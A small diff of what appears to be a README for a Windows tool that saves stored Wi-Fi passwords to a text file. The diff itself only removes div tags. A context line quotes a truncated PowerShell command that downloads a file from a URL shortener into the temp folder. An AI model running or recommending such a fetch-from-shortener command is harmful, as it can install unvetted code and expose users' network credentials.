@@ -59,7 +59,7 @@ powershell -Command "iwr -UseBasicParsing 'https://is.gd/sqd51' -OutFile '$env:T
 
 ## 🎬 Demo Preview
 
-<div align="center">
+
 
 ```
 ===========================================
@@ -82,7 +82,7 @@ Results saved to: C:\Users\You\Downloads\wlan_passwords.txt
 
 <img src="https://user-images.githubusercontent.com/74038190/212257465-7ce8d493-cac5-494e-982a-5a9deb852c4b.gif" width="100">
 
-</div>
+
 
 ---
 
